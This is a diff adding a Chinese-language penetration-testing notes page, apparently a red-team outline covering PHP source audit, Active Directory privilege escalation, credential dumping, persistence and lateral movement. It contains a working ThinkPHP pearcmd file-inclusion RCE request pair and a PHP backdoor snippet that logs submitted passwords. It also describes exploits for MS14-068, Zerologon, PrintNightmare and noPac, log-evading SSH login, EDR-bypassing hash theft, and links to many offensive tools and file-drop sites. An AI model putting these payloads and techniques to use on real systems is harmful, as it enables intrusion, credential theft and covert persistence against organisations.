+<li>直接RCE需要docker部署框架，并且需要php开启pear扩展（编译的时候有--with-pear配置）或者直接安装pear扩展的php并开启，包含该文件即可</li>
+<li>步骤</li>
+<li>GET /index.php?+config-create+/&amp;lang=../../../../../../../../../usr/local/lib/php/pearcmd&amp;/+/<?=phpinfo();?>+/tmp/test.php HTTP/1.1</li>
+<li>GET /index.php?lang=../../../../../../../../tmp/test HTTP/1.1</li>
+</ul>
+</li>
+<li>View::assign() 模板文件 变量覆盖+文件包含<ul>
+<li>版本范围：ThinkPHP 3.2.*, ThinkPHP  [5.0.0, 5.0.18], ThinkPHP [5.1.0, 5.1.10]</li>
+<li>条件</li>
+<li>通过View::assgin()给模板赋值的变量或变量内容可控。</li>
+<li>需要配合上传图片马或者日志文件、备份文件等，伪造正常文件，然后再请求包含</li>
+</ul>
+</li>
+<li>鉴权</li>
+<li>Route类动态参数<ul>
+<li>Route::get('view/:name$', 'News/read')-&gt;option('rule', 'admin');</li>
+</ul>
+</li>
+<li>
+<ol>
+<li>设置鉴权中间件（路由白名单）</li>
+<li>Route::rule('hello/:name','hello')-&gt;middleware('Auth');</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>前后置行为检测：beforeAction和afterAction</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>验证码登录</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>实现auth类和基于RBAC的第三方鉴权库</li>
+</ol>
+</li>
+<li>file_get_content</li>
+<li>任意文件读取</li>
+<li>ssrf<ul>
+<li>fsockopen</li>
+<li>readfile</li>
+<li>fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf</li>
+<li>file</li>
+<li>highlight_file/show_source</li>
+<li>parse_ini_file</li>
+<li>simplexml_load_file</li>
+</ul>
+</li>
+<li>curl</li>
+<li>php:input<ul>
+<li>/etc/passwd</li>
+</ul>
+</li>
+<li>extends</li>
+<li>鉴权类<ul>
+<li>没有就可以未授权</li>
+<li>但是要路由可访达</li>
+</ul>
+</li>
+<li>文件上传</li>
+<li>临时文件<ul>
+<li>条件竞争</li>
+</ul>
+</li>
+<li>后缀名判定</li>
+<li>phpinfo<ul>
+<li>写文件</li>
+</ul>
+</li>
+<li>xss打后台</li>
+<li>银行卡</li>
+<li>xss 接收平台</li>
+<li>is_dir/unlink</li>
+<li>文件操作函数触发phar反序列化<ul>
+<li>CI4</li>
+</ul>
+</li>
+<li>unlink删除一些lock文件<ul>
+<li>鸡肋</li>
+</ul>
+</li>
+<li>xss</li>
+<li>htmlspecialchars默认不转义单引号</li>
+<li>多次编码转换</li>
+</ul>
+<h4 id="cp-getshell_1">cp 站源码审计 getshell 实战</h4>
+<h4 id="zp-getshell">zp 站源码审计 getshell 实战</h4>
+<h4 id="oa">通达oa历史漏洞</h4>
+<h4 id="phpiotphp">商业加密php代码/iot设备的php管理页面</h4>
+<ul>
+<li>hook php dll函数dump明文</li>
+<li>内存dump明文</li>
+</ul>
+<h3 id="net">实战.net 站点代码审计</h3>
+<h4 id="java_2">java内存马</h4>
+<ul>
+<li>加载过程</li>
+<li>tomcat架构</li>
+<li>加载的安全机制</li>
+<li>广泛性</li>
+<li>反射和shell的区别</li>
+</ul>
+<h4 id="net_1">.net内存马</h4>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ">https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ</a></li>
+</ul>
+<h2 id="_36">**后渗透横向移动 **</h2>
+<h3 id="pc">服务器及个人 pc 信息收集工具及方法</h3>
+<h4 id="bypass-edr-hash">bypass edr 获取 hash</h4>
+<ul>
+<li>基础</li>
+<li>ntlm<ul>
+<li>winlogon.exe -&gt; 接收用户密码 -&gt; lsass.exe -&gt; 比对sam表</li>
+</ul>
+</li>
+<li>黄金票据</li>
+<li>白银票据</li>
+<li>钻石票据</li>
+<li>蓝宝石票据</li>
+<li>非约束委派</li>
+<li>约束委派</li>
+</ul>
+<h3 id="_37">域提权方式</h3>
+<h4 id="wsussccm">通过 wsus、sccm 提权</h4>
+<ul>
+<li><a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a></li>
+<li>域内补丁更新服务器，原理类似edr总控下发文件命令</li>
+<li><a href="https://github.com/xpn/sccmwtf">https://github.com/xpn/sccmwtf</a></li>
+<li>推powershell</li>
+</ul>
+<h4 id="azuread">通过 azureAD 提权</h4>
+<ul>
+<li>Azure AD Sync</li>
+</ul>
+<h4 id="_38">打邮服</h4>
+<ul>
+<li>域管登录过</li>
+<li>翻邮件</li>
+<li>有WriteACL权限，直接给自己dsync权限</li>
+<li><a href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a></li>
+</ul>
+<h4 id="_39">堡垒机/运维机</h4>
+<h4 id="web">web后门偷密码</h4>
+<ul>
+<li>if ($_SERVER['REQUEST_METHOD'] == 'POST') {      $username = $_POST['username'];    $password = $_POST['password'];      $data = $username . ':' . $password . PHP_EOL;   file_put_contents('users.txt', $data, FILE_APPEND | LOCK_EX);</li>
+</ul>
+<h4 id="hash">抓取域管登陆服务器的hash</h4>
+<h4 id="_40">找密码本</h4>
+<h4 id="_41">找特权组用户</h4>
+<ul>
+<li>Administrator</li>
+<li>Backup Operators</li>
+</ul>
+<h4 id="cve-2014-6324ms14-068">CVE-2014-6324（MS14-068）</h4>
+<ul>
+<li>利用前提</li>
+<li>域控没有打MS14-068的补丁(KB3011780)</li>
+<li>拿下一台加入域的计算机</li>
+<li>有这台域内计算机的域用户密码和Sid</li>
+<li>漏洞原因</li>
+<li>Client在发起认证请求时，通过设置include-PAC为False,则返回TGT中不会包含PAC</li>
+<li>KDC对PAC进行验证时，对于PAC尾部的签名算法，允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。因此伪造的任意内容都可以是合法的，直接加上内容的MD5值作为签名即可<ul>
+<li>构造高权限PAC</li>
+<li>512、520、518、519</li>
+</ul>
+</li>
+<li>PAC没有被放在TGT中，放在其它地方。KDC在仍然能够正确解析出没有放在TGT中的PAC信息PAC必须是密文，经过Key加密的KDC会从Authenticator中取出来subkey，把PAC信息解密并利用客户端设定的签名算法验证签名<ul>
+<li>enc-authorization-data</li>
+</ul>
+</li>
+<li>KDC验证缺少PAC的TGT成功后，再验证不在TGT中 的PAC的合法性。如果2个均验证成功，KDC把PAC中的User SID、Group SID取出来，重新使用进行签名，签名算法和密钥与设置include-pac标志位为TRUE时一模一样。将将新产生的PAC加入到解密后的TGT中，再重新加密制作全新的TGT发送给Client<ul>
+<li>因为请求的服务是krbtgt，所以返回的TGS票据是可以当做TGT</li>
+</ul>
+</li>
+<li>deploy</li>
+</ul>
+<h4 id="cve-2020-1472">CVE-2020-1472</h4>
+<ul>
+<li>MS-NRPC</li>
+<li>AES-CFB8<ul>
+<li>在明文前面添加 16 字节初始化向量 (IV) 来加密明文的每个字节，然后将 AES 应用于 IV 和明文的前 16 个字节，获取 AES 输出的第一个字节，并将其与下一个明文字节进行异或</li>
+<li>对于 256 个密钥中的 1 个，将 AESCFB8 加密应用于全零明文将产生全零密文，从而能够绕过登录</li>
+<li>使用 NetrServerPasswordSet2 方法，可以为客户端创建一个新密码，该密码可以使用 AES-CFB8 使用会话密钥进行加密。 Netlogon明文密码由516个字节组成，后四位表示密码长度。通过提供 516 个零，该密码将被解密为 516 个零或空密码</li>
+<li>server_auth = nrpc.hNetrServerAuthenticate3(      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,      target_computer + '\x00', ciphertext, flags    )</li>
+</ul>
+</li>
+</ul>
+<h4 id="cve-2021-1675cve-2021-34527printnightmare">CVE-2021-1675/CVE-2021-34527（PrintNightMare）</h4>
+<ul>
+<li>Print Spooler 服务</li>
+<li>RpcAddPrinterDriver<ul>
+<li>允许远程打印和驱动程序安装。该函数旨在为具有 Windows 特权 SeLoadDriverPrivilege 的用户提供向远程打印池添加驱动程序的能力。这个权限通常保留给内置 Administrators 组和可能有合法需要在远程终端用户机器上安装打印机驱动程序的 Print Operators 组的用户。</li>
+<li>允许任何经过身份验证的用户在没有上述特权的情况下向 Windows 系统添加打印驱动程序，从而使攻击者能够在受影响的系统上完全远程执行代码，权限为SYSTEM</li>
+</ul>
+</li>
+</ul>
+<h4 id="cve-2021-42287cve-2021-42278nopac">CVE-2021-42287&amp;CVE-2021-42278（noPac）</h4>
+<ul>
+<li>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</li>
+<li>CVE-2021-42287，创建一个与DC机器账户名称相同的机器账户(不以$结尾)，使用该账户请求一个TGT后，修改账户名，然后通过S4U2Self申请TGS Ticket，然后DC进行在TGS_REP阶段加密TGS Ticket时，无法找到该账户利用机器账户hash加密，DC便使用自己的hash加密TGS Ticket，提供一个属于该账户的PAC，我们便可得到一个高权限的ST</li>
+<li>MS-DS-Machine-Account-Quota=0</li>
+<li><strong>需要对⼀个账⼾有写权限</strong><ul>
+<li>GenericAll</li>
+<li>对某些<strong>机器、或是用户</strong>有写权限的组</li>
+<li>加域账号</li>
+</ul>
+</li>
+</ul>
+<h4 id="adcs">通过域中继漏洞提权或adcs漏洞等</h4>
+<ul>
+<li>CVE-2022-26923</li>
+<li>DNShostname</li>
+<li>NTLM中继</li>
+<li>Responder</li>
+<li>Inveigh</li>
+<li>multirelayx.py</li>
+<li>PrinterBug</li>
+<li>PeitiPotam</li>
+<li>DFSCoerce</li>
+<li>ShadowCoerce</li>
+<li>PrivExchange</li>
+<li><a href="https://github.com/p0dalirius/Coercer">https://github.com/p0dalirius/Coercer</a></li>
+</ul>
+<h4 id="distributed-com-usersperformance-log-users">通过Distributed-COM-Users或者Performance-Log-Users权限获得域控权限</h4>
+<ul>
+<li><a href="https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/">https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/</a></li>
+</ul>
+<h4 id="azure-ad">获取到Azure AD连接同步账户</h4>
+<ul>
+<li>DC SYNC</li>
+</ul>
+<h4 id="_42">分析组策略</h4>
+<ul>
+<li><a href="https://github.com/synacktiv/gpoParser/tree/main">https://github.com/synacktiv/gpoParser/tree/main</a></li>
+</ul>
+<h4 id="httpsgithubcomevilashzpigadvulnscanner"><a href="https://github.com/evilashz/PIGADVulnScanner">https://github.com/evilashz/PIGADVulnScanner</a></h4>
+<h3 id="_43">服务器提权</h3>
+<h4 id="potato">Potato 系列提权原理讲解与免杀</h4>
+<ul>
+<li>SeImpersonate身份验证后模拟客户端</li>
+<li>Windows 2000 SP4</li>
+<li>服务控制管理器启动的服务</li>
+<li>由 COM 基础架构启动并配置为在特定账户下运行的 COM 服务器</li>
+<li>设备本地管理员组的成员</li>
+<li>设备本地服务帐户</li>
+<li>Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment<ul>
+<li>gpedit</li>
+</ul>
+</li>
+<li>这玩意是给线程的</li>
+<li>com 基础</li>
+<li>每个 COM 接口都必须直接或间接继承自名为 IUnknown 的接口。 此接口提供一些所有 COM 对象都必须支持的基线功能<ul>
+<li>IUnknown</li>
+<li>QueryInterface<ul>
+<li>dynamic_cast</li>
+<li>hr = pFileOpen-&gt;QueryInterface(IID_IFileDialogCustomize,reinterpret_cast<void**>(&amp;pCustom));</li>
+</ul>
+</li>
+<li>AddRef<ul>
+<li>对象引用计数</li>
+</ul>
+</li>
+<li>Release</li>
+</ul>
+</li>
+<li>com 事件<ul>
+<li>event_source</li>
+<li>event_receiver</li>
+</ul>
+</li>
+<li>BSTR<ul>
+<li>在分配时会在字符串前面额外存储一个 4 字节的长度字段，记录字符串的字节数（不包括结尾的空字符 \0）</li>
+</ul>
+</li>
+<li>内存<ul>
+<li>CoTaskMemAlloc</li>
+<li>CoTaskMemFree</li>
+</ul>
+</li>
+<li>__uuidof</li>
+<li>IID_PPV_ARGS<ul>
+<li>pFileOpen-&gt;QueryInterface(IID_PPV_ARGS(&amp;pCustom))</li>
+</ul>
+</li>
+<li>SafeRelease</li>
+<li>CComPtr<ul>
+<li>不显式调用 Release</li>
+<li>pFileOpen.CoCreateInstance(__uuidof(FileOpenDialog));</li>
+</ul>
+</li>
+<li>Rotten Potato</li>
+<li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp</a></li>
+<li>SSPI<ul>
+<li>SSPI 全称 Security Support Provider Interface（安全支持提供者接口），是 Windows 操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API</li>
+<li>SSP</li>
+<li>Microsoft 安全支持提供程序接口 (SSPI) 是 Windows 身份验证的基础。 要求身份验证的应用程序和基础结构服务会使用 SSPI ，使用的协议就是以下 SSP 安全协议</li>
+<li>NTLM SSP<ul>
+<li>Challenge/Response 验证机制</li>
+<li>客户端利用 NTLM SSP 生成 NTLM_NEGOTIATE 消息 （被称为 TYPE 1 消息），并将 TYPE 1 消息发送给服务端。</li>
+<li>服务端接收到客户端发送过来的 TYPE 1 消息，传入 NTLM SSP，得到 NTLM_CHALLENGE 消息（被称为 TYPE 2消息），并将此消息发回客户端。此消息中包含了一个由服务端生成的随机值，此随机值被称为 challenge。</li>
+<li>客户端收到服务端返回的 TYPE 2 消息，并取出其中的随机值 challenge。客户端将密码 （123） 转换为 LM HASH 与 NT HASH，同时利用计算出来的 LM HASH 与/或 NT HASH 对 challenge 进行一些计算。</li>
+<li>服务端收到 TYPE 3 消息后，将会重复第 3 步客户端的操作，也计算出来一个 hash。然后将自己计算出来的 hash 与客户端发送过来的 TYPE 3 消息中的 hash 进行对比，如果一样，则客户端验证成功。不一样，则客户端验证失败</li>
+</ul>
+</li>
+<li>Kerberos<ul>
+<li>基于 ticket 的身份验证机制</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CoGetInstanceFromIStorage<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage">https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage</a></li>
+</ul>
+</li>
+<li><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a></li>
+</ul>
+<h4 id="_44">内核漏洞提权</h4>
+<h3 id="_45">域内横向移动方法及工具免杀</h3>
+<h4 id="rpc">利用 RPC 域内信息收集与横向移动</h4>
+<ul>
+<li>横向</li>
+<li><a href="https://github.com/XiaoliChan/wmiexec-Pro">https://github.com/XiaoliChan/wmiexec-Pro</a><ul>
+<li>Win32_ScheduledJob</li>
+</ul>
+</li>
+<li><a href="https://github.com/JDArmy/NO445-lateral-movement">https://github.com/JDArmy/NO445-lateral-movement</a><ul>
+<li>Win32_Process</li>
+</ul>
+</li>
+<li><a href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></li>
+<li><a href="https://github.com/XiaoliChan/wmiexec-RegOut">https://github.com/XiaoliChan/wmiexec-RegOut</a></li>
+<li><a href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a><ul>
+<li>hRChangeServiceConfigW</li>
+</ul>
+</li>
+<li><a href="https://github.com/airzero24/WMIReg">https://github.com/airzero24/WMIReg</a><ul>
+<li>StdRegProv</li>
+</ul>
+</li>
+<li><a href="https://github.com/lexfo/rpc2socks">https://github.com/lexfo/rpc2socks</a><ul>
+<li>socks</li>
+</ul>
+</li>
+<li><a href="https://github.com/Marshall-Hallenbeck/ms_scmr">https://github.com/Marshall-Hallenbeck/ms_scmr</a><ul>
+<li>上传文件等</li>
+</ul>
+</li>
+<li><a href="https://github.com/zyn3rgy/smbtakeover">https://github.com/zyn3rgy/smbtakeover</a><ul>
+<li>解除 445/tcp 绑定</li>
+</ul>
+</li>
+<li><a href="https://github.com/WKL-Sec/dcomhijack">https://github.com/WKL-Sec/dcomhijack</a><ul>
+<li>dcom相关dll劫持</li>
+</ul>
+</li>
+<li><a href="https://github.com/zcgonvh/TaskSchedulerMisc">https://github.com/zcgonvh/TaskSchedulerMisc</a><ul>
+<li>MS-TSCH 计划任务</li>
+</ul>
+</li>
+<li>信息收集</li>
+<li><a href="https://github.com/JDArmy/RPCSCAN">https://github.com/JDArmy/RPCSCAN</a><ul>
+<li>ms-epmap</li>
+</ul>
+</li>
+<li><a href="https://github.com/StarfireLab/EFSRPCrpc">https://github.com/StarfireLab/EFSRPCrpc</a><ul>
+<li>EFSRPC-ping</li>
+</ul>
+</li>
+<li>rpc</li>
+<li><a href="https://github.com/sogeti-esec-lab/RPCForge">https://github.com/sogeti-esec-lab/RPCForge</a><ul>
+<li>fuzz</li>
+</ul>
+</li>
+<li><a href="https://github.com/hfiref0x/WinObjEx64">https://github.com/hfiref0x/WinObjEx64</a><ul>
+<li>windows对象查看器</li>
+</ul>
+</li>
+<li><a href="https://github.com/tothi/serviceDetector">https://github.com/tothi/serviceDetector</a><ul>
+<li>连接445通过ms-lsat查询已安装的服务</li>
+</ul>
+</li>
+<li><a href="https://github.com/cyberark/RPCMon">https://github.com/cyberark/RPCMon</a><ul>
+<li>监控rpc</li>
+</ul>
+</li>
+<li><a href="https://github.com/zodiacon/WFPExplorer">https://github.com/zodiacon/WFPExplorer</a><ul>
+<li>Windows 过滤平台对象</li>
+</ul>
+</li>
+<li><a href="https://github.com/CICADA8-Research/COMThanasia">https://github.com/CICADA8-Research/COMThanasia</a><ul>
+<li>com对象分析工具</li>
+</ul>
+</li>
+</ul>
+<h4 id="_46">域内凭证及口令收集</h4>
+<ul>
+<li><a href="https://github.com/ly4k/PassTheChallenge">https://github.com/ly4k/PassTheChallenge</a></li>
+<li>Credential Guard 凭证保护服务</li>
+<li><a href="https://github.com/ly4k/Pypykatz">https://github.com/ly4k/Pypykatz</a></li>
+<li>python mimikatz</li>
+<li><a href="https://github.com/praetorian-inc/ADFSRelay">https://github.com/praetorian-inc/ADFSRelay</a></li>
+<li>adfs认证relay</li>
+<li><a href="https://github.com/med0x2e/NTLMRelay2Self">https://github.com/med0x2e/NTLMRelay2Self</a></li>
+<li>web relay</li>
+<li><a href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></li>
+<li>Windows 错误报告服务</li>
+<li><a href="https://github.com/tothi/rbcd-attack">https://github.com/tothi/rbcd-attack</a></li>
+<li>资源约束委派</li>
+<li><a href="https://github.com/wjlab/Darksteel">https://github.com/wjlab/Darksteel</a></li>
+<li>域内自动化信息搜集</li>
+<li><a href="https://github.com/lele8/SharpUserIP">https://github.com/lele8/SharpUserIP</a></li>
+<li>在域控或远程提取登录日志，快速获取域用户对应的 IP 地址</li>
+<li><a href="https://github.com/aleenzz/ADExplorerX">https://github.com/aleenzz/ADExplorerX</a></li>
+<li>ad浏览器</li>
+<li><a href="https://github.com/outflanknl/Dumpert">https://github.com/outflanknl/Dumpert</a></li>
+<li>System Calls<ul>
+<li>old</li>
+</ul>
+</li>
+<li><a href="https://github.com/zblurx/certsync">https://github.com/zblurx/certsync</a></li>
+<li>证书利用</li>
+<li><a href="https://github.com/battleoverflow/lsass-dump">https://github.com/battleoverflow/lsass-dump</a></li>
+<li>导出的简单演示</li>
+<li><a href="https://github.com/0x727/UserRegEnum_0x727">https://github.com/0x727/UserRegEnum_0x727</a></li>
+<li>域内普通域用户权限查找域内所有计算机上登录的用户</li>
+<li><a href="https://github.com/Avienma/DumpHash">https://github.com/Avienma/DumpHash</a></li>
+<li>干净的hash导出但是要求权限很高</li>
+<li><a href="https://github.com/GamehunterKaan/Plog">https://github.com/GamehunterKaan/Plog</a></li>
+<li>mimikatz导出密码模块</li>
+<li><a href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></li>
+<li>只读dpapi</li>
+<li><a href="https://github.com/mdsecactivebreach/DragonCastle">https://github.com/mdsecactivebreach/DragonCastle</a></li>
+<li>dll劫持读hash</li>
+<li><a href="https://github.com/expl0itabl3/EZDump">https://github.com/expl0itabl3/EZDump</a></li>
+<li>简单导出c#</li>
+<li><a href="https://github.com/nettitude/ETWHash">https://github.com/nettitude/ETWHash</a></li>
+<li>利用etw事件读取hash</li>
+<li><a href="https://github.com/4ndr34z/ntlmthief">https://github.com/4ndr34z/ntlmthief</a></li>
+<li>利用sspi读取hash</li>
+<li><a href="https://github.com/gabriellandau/PPLFault">https://github.com/gabriellandau/PPLFault</a></li>
+<li>攻击ppl进程保护技术读取hash</li>
+<li><a href="https://github.com/grimlockx/ADCSKiller">https://github.com/grimlockx/ADCSKiller</a></li>
+<li>adcs利用工具</li>
+<li><a href="https://github.com/OmriBaso/RToolZ">https://github.com/OmriBaso/RToolZ</a></li>
+<li>利用 ProcExp152.sys 驱动程序转储 PPL Lsass</li>
+<li><a href="https://github.com/BeichenDream/SharpToken">https://github.com/BeichenDream/SharpToken</a></li>
+<li>找到系统中所有进程泄露的 Token</li>
+<li><a href="https://github.com/S12cybersecurity/RDPCredentialStealer">https://github.com/S12cybersecurity/RDPCredentialStealer</a></li>
+<li>Detours API Hooking读rdp登录凭证</li>
+<li><a href="https://github.com/Heart-Sky/ListRDPConnections">https://github.com/Heart-Sky/ListRDPConnections</a></li>
+<li>列出所有rdp连接记录</li>
+<li><a href="https://github.com/0neAtSec/SharpDomainInfo">https://github.com/0neAtSec/SharpDomainInfo</a></li>
+<li>自动化信息收集</li>
+<li><a href="https://github.com/Tw1sm/spraycharles">https://github.com/Tw1sm/spraycharles</a></li>
+<li>慢速密码喷射</li>
+<li><a href="https://github.com/synacktiv/GPOddity">https://github.com/synacktiv/GPOddity</a></li>
+<li><a href="https://github.com/grayhatkiller/SharpExShell">https://github.com/grayhatkiller/SharpExShell</a></li>
+<li><a href="https://github.com/djackreuter/proc_noprocdump">https://github.com/djackreuter/proc_noprocdump</a></li>
+<li><a href="https://github.com/mtth-bfft/adeleg">https://github.com/mtth-bfft/adeleg</a></li>
+<li>查所有委派</li>
+<li><a href="https://github.com/ricardojoserf/NativeDump">https://github.com/ricardojoserf/NativeDump</a></li>
+<li><a href="https://github.com/MzHmO/LeakedWallpaper">https://github.com/MzHmO/LeakedWallpaper</a></li>
+<li>从session提取hash</li>
+<li><a href="https://github.com/Offensive-Panda/LsassReflectDumping">https://github.com/Offensive-Panda/LsassReflectDumping</a></li>
+<li><a href="https://github.com/Offensive-Panda/ShadowDumper">https://github.com/Offensive-Panda/ShadowDumper</a></li>
+<li>多种方式导出hash</li>
+</ul>
+<h3 id="_47">权限维持方法</h3>
+<h4 id="windows">windows 后门</h4>
+<ul>
+<li>自启动后门</li>
+<li><a href="https://github.com/mdsecactivebreach/WMIPersistence">https://github.com/mdsecactivebreach/WMIPersistence</a></li>
+<li><a href="https://github.com/netero1010/GhostTask">https://github.com/netero1010/GhostTask</a></li>
+</ul>
+<h4 id="linux">linux 后门</h4>
+<ul>
+<li>PAM 后门</li>
+<li>tsh 后门</li>
+</ul>
+<h4 id="_48">修改源码插入后门</h4>
+<h3 id="_49">内网核心设备攻防及信息收集思路</h3>
+<h4 id="nas">nas</h4>
+<h4 id="_50">邮服</h4>
+<h4 id="_51">堡垒机</h4>
+<h4 id="vcenter">vcenter</h4>
+<h4 id="vdi">vdi 云桌面</h4>
+<h4 id="vpn">vpn</h4>
+<h3 id="_52">非域内网渗透</h3>
+<h4 id="_53">怎么进去的</h4>
+<ul>
+<li>（web打点）linux getshell</li>
+<li>重新爬取web源码找敏感信息<ul>
+<li>secretkey|硬编码</li>
+<li>url</li>
+<li>拖回来审代码</li>
+<li>找更多漏洞维持权限</li>
+<li>找web可访达目录</li>
+<li>放马</li>
+</ul>
+</li>
+<li>找本机关键信息<ul>
+<li>host</li>
+<li>history</li>
+<li>.....</li>
+<li>.viminfo</li>
+<li>ssh私钥</li>
+</ul>
+</li>
+<li>PAM抓ssh密码<ul>
+<li>so文件本地搭环境自己编译</li>
+</ul>
+</li>
+<li>扫内存<ul>
+<li><a href="https://github.com/liamg/dismember">https://github.com/liamg/dismember</a></li>
+</ul>
+</li>
+<li><a href="https://platypus-reverse-shell.vercel.app/">https://platypus-reverse-shell.vercel.app</a></li>
+<li>找目录<ul>
+<li>
+<blockquote>
+<p>find / -writable -type d 2&gt;/dev/null      # 可写目录
+find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 
+find / -perm -o w -type d 2&gt;/dev/null     # 可写目录
+find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录
+find / ( -perm -o w -perm -o x ) -type d 2&gt;/dev/null   # 可写可执行目录</p>
+</blockquote>
+</li>
+<li>attrib +s +h +r 1.txt 修改文件时间</li>
+</ul>
+</li>
+<li>查iptable</li>
+<li>ssh -T root@192.168.1.1 /usr/bin/bash -i<ul>
+<li>幽灵登陆</li>
+<li>不分配伪终端无日志有连接</li>
+</ul>
+</li>
+<li>grep -rn "jdbc:oracle" /opt/SuperMap/TongWeb7.0.4.1/domains/tw_80/<ul>
+<li>搜索包含特定字符串内容的文件</li>
+</ul>
+</li>
+<li>vpn</li>
+<li>漏洞获取shell</li>
+<li>漏洞泄露用户名密码<ul>
+<li>fortinet</li>
+</ul>
+</li>
+<li>漏洞泄露cookie<ul>
+<li>有些云桌面</li>
+<li>勒索</li>
+</ul>
+</li>
+<li>流量清晰可见、快速找跳板机</li>
+<li>sso</li>
+<li>dns劫持绕过二次验证</li>
+<li>注意对方设备登录提醒</li>
+<li>oauth漏洞</li>
+<li>单挂一台windows</li>
+<li>注册表信息收集<ul>
+<li><a href="https://github.com/SpecterOps/Nemesis">https://github.com/SpecterOps/Nemesis</a></li>
+</ul>
+</li>
+<li>找敏感文件<ul>
+<li><a href="https://github.com/c1y2m3/FileSearch">https://github.com/c1y2m3/FileSearch</a></li>
+<li><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a></li>
+<li><a href="https://github.com/mandiant/msi-search">https://github.com/mandiant/msi-search</a></li>
+<li><a href="https://github.com/AabyssZG/FindEverything">https://github.com/AabyssZG/FindEverything</a></li>
+<li>指定磁盘下搜索特定名称的文件</li>
+<li>dir D:\ /S /B | find "orange1.jsp"</li>
+<li>/S          显示指定目录和所有子目录中的文件。</li>
+<li>/B          使用空格式(没有标题信息或摘要)。</li>
+<li>全盘搜索特定名称的文件</li>
+<li>cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2&gt;nul | findstr "ToDesk_Lite.exe""</li>
+</ul>
+</li>
+<li>rdp劫持<ul>
+<li><a href="https://github.com/S12cybersecurity/RDPCredentialStealer">https://github.com/S12cybersecurity/RDPCredentialStealer</a></li>
+<li><a href="https://github.com/GoSecure/pyrdp">https://github.com/GoSecure/pyrdp</a></li>
+<li><a href="https://github.com/0x09AL/RdpThief">https://github.com/0x09AL/RdpThief</a></li>
+</ul>
+</li>
+<li>查看历史记录<ul>
+<li>cmd下：doskey /history</li>
+<li>powershell下：Get-History</li>
+</ul>
+</li>
+<li>远控开发<ul>
+<li>执行命令</li>
+<li>列目录</li>
+<li>云oss+git</li>
+</ul>
+</li>
+<li>onedrive\ossutil\github lfs</li>
+<li><a href="https://gofile.io/">https://gofile.io/</a>、<a href="https://send.cm/">https://send.cm/</a>、<a href="https://krakenfiles.com/">https://krakenfiles.com/</a>、<a href="https://download.ru/">https://download.ru/</a></li>
+</ul>
+<h4 id="_54">横向</h4>
+<ul>
+<li>web端口</li>
+<li>常见web端口</li>
+<li>服务器信息收集到的web端口<ul>
+<li>log</li>
+<li>连接</li>
+</ul>
+</li>
+<li>其他端口漏洞</li>
+<li><a href="https://github.com/AabyssZG/Docker-TCP-Scan">https://github.com/AabyssZG/Docker-TCP-Scan</a></li>
+<li>做字典密码喷射<ul>
+<li>连接工具|elastic....</li>
+<li><a href="https://github.com/team-ide/teamide">https://github.com/team-ide/teamide</a></li>
+</ul>
+</li>
+<li>数据库getshell</li>
+<li>...</li>
+<li>Kubernetes:8443端口</li>
+<li>关键网络设施|网关|dns|设备弱口令</li>
+<li>dns劫持<ul>
+<li>甲方蓝军</li>
+<li>国际酒店</li>
+<li>Ettercap|http</li>
+</ul>
+</li>
+<li>switch<ul>
+<li>弱口令</li>
+<li>cirtx</li>
+<li><a href="https://github.com/Blootus/CVE-2024-20399-Cisco-RCE">https://github.com/Blootus/CVE-2024-20399-Cisco-RCE</a></li>
+</ul>
+</li>
+<li>爆破域名</li>
+</ul>
+<h4 id="_55">找域</h4>
+<ul>
+<li><a href="https://github.com/sosdave/KeyTabExtract">https://github.com/sosdave/KeyTabExtract</a></li>
+<li>resolve.conf</li>
+<li>dns</li>
+<li>/etc/krb5.conf</li>
+<li>smb.conf</li>
+<li>cifs挂载</li>
+<li>找nas</li>
+<li>找ad验证web服务</li>
+<li>源码+服务器配置文件</li>
+<li>找vdi</li>
+<li>常见的与信息收集命令，涉及到请求与空服务器的都不要用</li>
+<li>找wsus</li>
+<li>找sccm</li>
+<li>找edr管控终端</li>
+<li>查看网络连接</li>
+<li>139<ul>
+<li>双网卡</li>
+</ul>
+</li>
+<li>445</li>
+<li>389</li>
+<li>636</li>
+<li>gitlab等...</li>
+</ul>
+<h4 id="tv">tv|向日葵|</h4>
+<h3 id="pc_1">服务器及个人 pc 信息收集工具及方法</h3>
+<h4 id="bypass-edr-hash_1">bypass edr 获取 hash</h4>
